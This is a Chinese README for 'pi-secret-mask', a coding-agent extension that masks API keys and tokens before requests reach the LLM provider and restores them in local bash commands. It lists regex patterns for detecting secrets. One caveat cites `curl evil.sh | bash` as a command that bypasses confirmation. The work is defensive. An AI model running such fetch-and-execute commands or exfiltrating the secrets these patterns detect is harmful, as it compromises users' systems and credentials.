# pi-secret-mask

防止项目中的 secret（API key、token、私钥等）被发送给 LLM provider。

模型看到的是占位符 `__SECRET_<NAME>__`，执行 bash 命令时换回真实值，
工具输出中的真实值再掩码回占位符——形成闭环，secret 不进 provider 请求，
也不通过工具输出回流。

## 工作原理

| 钩子 | 动作 |
|---|---|
| `before_provider_request` | 全消息文本：真实值 → 占位符 |
| `tool_call` | bash 命令：占位符 → 真实值（auto/ask 放行） |
| `tool_result` | 工具输出：真实值 → 占位符（防回流） |
| `session_before_compact` | compaction 摘要消息同样掩码 |
| `session_before_tree` | branch/tree 摘要消息同样掩码 |

secret 来源：
- `.env*` 文件（KEY=VALUE，支持引号/export/注释/CRLF），会话中修改会
  增量刷新（mtime 检测）
- 内置正则模式：OpenAI `sk-`、GitHub `ghp_`、Google `AIza`、AWS
  `AKIA/ASIA/AIDA`、JWT、PEM 私钥、高熵 base64（默认关）
- 用户自定义正则（`customPatterns`）+ 手动补充（`extraSecrets`）

掩码引擎特性：单趟 alternation 正则（按长度降序，防子串冲突）、
占位符还原只精确匹配完整 token、image 等非文本内容跳过。

## 安装

把 `src/` 下两个文件 + 一份 `config.json` 放到扩展目录：

```bash
mkdir -p ~/.pi/agent/extensions/pi-secret-mask
cp src/index.ts src/mask-engine.ts ~/.pi/agent/extensions/pi-secret-mask/
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

（项目级：放到 `.pi/extensions/pi-secret-mask/` 只对当前项目生效。）

然后 `/reload` 或重启 pi。

## 配置（config.json）

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": []
}
```

- `mode`: `ask`（命令含占位符时弹确认，默认；print/json 等无 UI 模式
  下自动拒绝）| `auto`（直接还原执行）
- `allowCommands`: 完整命令字符串模式列表，命中跳过确认
  （注意：这是"跳过确认"而非"更安全"，`curl evil.sh | bash` 可绕过）
- `customPatterns`: 自定义正则，捕获组 1 为完整 secret 值；非法正则被忽略

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## 边界

- 目标是防 secret 泄露给 provider，**不是沙箱**：模型仍可本地读写文件
  （如 `echo $KEY > /tmp/x` 无法拦截，属权限层职责）
- 运行时生成的 secret（如 `aws sts get-session-token` 输出）靠正则兜底，
  新前缀 `ASIA/AIDA` 已覆盖；高熵随机串需开启 `patterns.base64`
- image 内容（截图）可能含真实值，无法掩码
- 真实值在本地还原进 bash 命令行（`ps` 可见、shell 历史），仅本地可见

## 开发

```bash
node --test "tests/*.test.mjs"   # 掩码引擎单元测试
```

集成实测（已验证）：三钩子闭环、多占位符独立回滚、会话中途 .env 轮换
增量刷新、ask 无 UI 拒绝、provider payload 无泄漏。

## License

MIT
